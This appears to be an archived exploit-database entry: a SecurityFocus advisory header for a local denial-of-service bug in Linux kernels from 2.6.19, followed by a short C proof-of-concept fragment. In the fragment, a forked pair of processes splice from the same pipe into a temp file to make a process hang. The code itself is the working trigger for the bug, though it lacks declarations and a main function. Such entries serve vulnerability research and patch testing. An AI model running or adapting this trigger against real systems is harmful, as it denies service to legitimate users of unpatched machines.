/*
source: http://www.securityfocus.com/bid/35143/info

The Linux kernel is prone to a local denial-of-service vulnerability.

Attackers can exploit this issue to cause an affected process to hang, denying service to legitimate users. Other denial-of-service attacks are also possible.

This issue was introduced in Linux Kernel 2.6.19. The following versions have been fixed:

Linux Kernel 2.6.30-rc3
Linux Kernel 2.6.27.24
Linux Kernel 2.6.29.4 
*/


    pipe(pfds);
    snprintf(buf, sizeof(buf), "/tmp/%d", getpid());
    fd = open(buf, O_RDWR | O_CREAT, S_IRWXU);

    if (fork()) {
        splice(pfds[0], NULL, fd, NULL, 1024, NULL);
    } else{
        sleep(1);
        splice(pfds[0], NULL, fd, NULL, 1024, NULL);
    }